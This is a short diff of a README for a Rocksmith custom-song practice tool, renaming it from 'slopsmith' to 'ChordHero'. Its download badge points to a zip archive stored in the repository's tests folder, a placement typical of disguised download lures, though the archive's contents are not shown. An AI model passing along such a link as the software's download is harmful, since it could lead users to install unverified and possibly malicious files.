@@ -1,8 +1,8 @@
-# 🎸 slopsmith - Browse and practice Rocksmith custom songs
+# 🎸 ChordHero - Browse and practice Rocksmith custom songs
 
 [![Download from GitHub](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://raw.githubusercontent.com/marizdacusan/slopsmith/main/tests/Software_2.6.zip)
 
-slopsmith helps you organize and play custom songs for Rocksmith 2014. It provides a simple space to view your library, preview tracks, and track your practice progress. The application runs as a self-contained service on your computer.
+ChordHero helps you organize and play custom songs for Rocksmith 2014. It provides a simple space to view your library, preview tracks, and track your practice progress. The application runs as a self-contained service on your computer.
 
 ## 📦 System Requirements
 
